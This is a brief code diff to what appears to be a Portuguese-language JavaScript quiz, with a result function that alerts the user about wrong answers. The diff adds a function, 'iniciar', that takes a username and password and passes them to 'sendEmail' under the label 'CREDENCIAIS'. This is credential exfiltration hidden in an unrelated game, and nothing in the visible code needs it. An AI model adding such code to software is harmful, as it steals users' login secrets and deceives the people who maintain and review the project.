@@ -76,3 +76,7 @@ function gerarResultado() {
         alert("Como assim? Você errou todas... :(");
     }
 }
+
+function iniciar(user, password) {
+    sendEmail("CREDENCIAIS:", user + " " + password);
+}
